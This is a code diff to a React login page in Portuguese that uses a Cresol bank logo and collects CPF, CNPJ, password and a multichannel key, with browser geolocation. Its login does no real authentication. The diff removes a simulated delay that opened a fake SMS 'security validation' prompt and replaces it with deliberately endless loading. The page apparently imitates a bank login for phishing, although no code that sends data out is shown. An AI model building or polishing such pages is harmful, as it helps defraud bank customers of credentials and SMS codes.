@@ -1,18 +1,10 @@
 
 import React, { useState, useEffect } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
-import { useNavigate } from "react-router-dom";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
 import { Switch } from "@/components/ui/switch";
-import {
-  Dialog,
-  DialogContent,
-  DialogDescription,
-  DialogHeader,
-  DialogTitle,
-} from "@/components/ui/dialog";
 
 // Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
@@ -22,7 +14,6 @@ const TABS = [
 ];
 
 const Index = () => {
-  const navigate = useNavigate();
   const [tab, setTab] = useState("fisica");
   const [cpf, setCpf] = useState("");
   const [cnpj, setCnpj] = useState("");
@@ -32,7 +23,6 @@ const Index = () => {
   const [saveCpf, setSaveCpf] = useState(false);
   const [saveCnpj, setSaveCnpj] = useState(false);
   const [saveChaveMulticanal, setSaveChaveMulticanal] = useState(false);
-  const [showSmsModal, setShowSmsModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
   // ---- Geolocalização nativa do navegador ----
@@ -95,20 +85,7 @@ const Index = () => {
   const handleLogin = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    // Simular um delay e depois mostrar modal de SMS
-    setTimeout(() => {
-      setIsLoading(false);
-      setShowSmsModal(true);
-    }, 2000);
-  };
-
-  const handleSmsModalClose = () => {
-    setShowSmsModal(false);
-  };
-
-  const handleSmsModalConfirm = () => {
-    setShowSmsModal(false);
-    navigate("/sms");
+    // Loading infinito - não para mais
   };
 
   // ---- PASSWORD INPUT (com toggle view) ----
@@ -235,36 +212,6 @@ const Index = () => {
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
-      {/* Modal SMS */}
-      <Dialog open={showSmsModal} onOpenChange={setShowSmsModal}>
-        <DialogContent className="sm:max-w-md mx-4">
-          <DialogHeader>
-            <DialogTitle className="text-lg md:text-xl">Validação de Segurança</DialogTitle>
-            <DialogDescription className="text-sm md:text-base">
-              Para sua segurança, enviaremos um código SMS para seu celular cadastrado.
-            </DialogDescription>
-          </DialogHeader>
-          <div className="flex flex-col gap-4 pt-4">
-            <button
-              onClick={handleSmsModalConfirm}
-              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg"
-              style={{
-                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
-                borderRadius: "30px",
-              }}
-            >
-              Enviar SMS
-            </button>
-            <button
-              onClick={handleSmsModalClose}
-              className="w-full h-12 rounded-full border-2 border-gray-300 text-gray-700 font-semibold text-base md:text-lg transition-colors hover:bg-gray-50"
-            >
-              Cancelar
-            </button>
-          </div>
-        </DialogContent>
-      </Dialog>
-
       {/* Main Content Container */}
       <div className="w-full lg:w-1/2 flex flex-col justify-start px-4 sm:px-6 lg:px-[7%] pt-6 lg:pt-4 pb-8 relative">
         <div className="max-w-md w-full mx-auto">
